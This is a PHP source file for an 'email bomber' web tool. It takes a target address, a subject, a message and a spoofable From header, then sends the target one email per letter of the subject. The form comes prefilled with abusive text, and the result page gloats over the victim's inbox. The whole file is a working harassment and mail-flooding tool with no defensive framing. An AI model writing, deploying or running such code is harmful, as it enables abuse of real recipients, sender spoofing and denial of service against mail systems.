<?php
include('toolheader.php');
?>
<font face=arial>
<?php
if (!$step){
$step = "1";
}

if ($step=="1"){
?>
<form method=post action=bomb2.php><div align="center"><br>
    The amount of emails sent to this person will be<br>
    the number of letters in the subject line.<br>
    <br>
    <table width="487" border="0" cellspacing="2" cellpadding="2">
      <tr> 
        <td width="108" align="right"><font face="Arial, Helvetica, sans-serif">To 
          Who? </font></td>
        <td width="357"> 
          <input type="text" name="email">
        </td>
      </tr>
      <tr> 
        <td width="108" align="right"><font face="Arial, Helvetica, sans-serif">Why? 
          (subject) </font></td>
        <td width="357"> 
          <input type="text" name="subject" value="because you fucking suck">
        </td>
      </tr>
      <tr> 
        <td width="108" align="right"><font face="Arial, Helvetica, sans-serif">What 
          To Say?</font></td>
        <td width="357"> 
          <input type="text" name="msg" value="you are a lamer.">
        </td>
      </tr>
      <tr> 
        <td width="108" align="right"><font face="Arial, Helvetica, sans-serif">Headers:</font></td>
        <td width="357"> 
          <input type="text" name="header" value="From: email@address.com">
        </td>
      </tr>
      <tr> 
        <td width="108" align="right"><font face="Arial, Helvetica, sans-serif">Do 
          It? </font></td>
        <td width="357"> 
          <input type="submit" name="Submit" value="Yes">
          <input type="hidden" name="step" value="2">
        </td>
      </tr>
    </table>
<br>
    <a href=bomb.php3>regular bomber</a></div>
</form>
<?php

} elseif ($step=="2"){

$x = strlen($subject);

$sub;

for ($i=0; $i<$x; $i++){
$sub = "|";
for ($z=-1; $z<$i; $z++){
$sub .= " ";
}

$sub .= $subject[$i];

mail($email,$sub,$msg,$header) or die('Couldn\'t BoMb the fucker.');
}

?>
<div align="center"><b>Well, the person recieving email at:</b><br>
  <?php echo $email;?><br>
  <b>will not be happy when they have to delete:</b><br>
  <?php echo $x;?><br>
  <b>emails with:</b><br>
  <?php echo $msg;?><br>
  <b>as the message</b><br>
  <?php echo $header;?><br>
  <br>
  <a href="bomb2.php?step=1">Do It Again?</a></div>

<?php
}
?>
</font>
<?php
include('toolfooter.php');
?>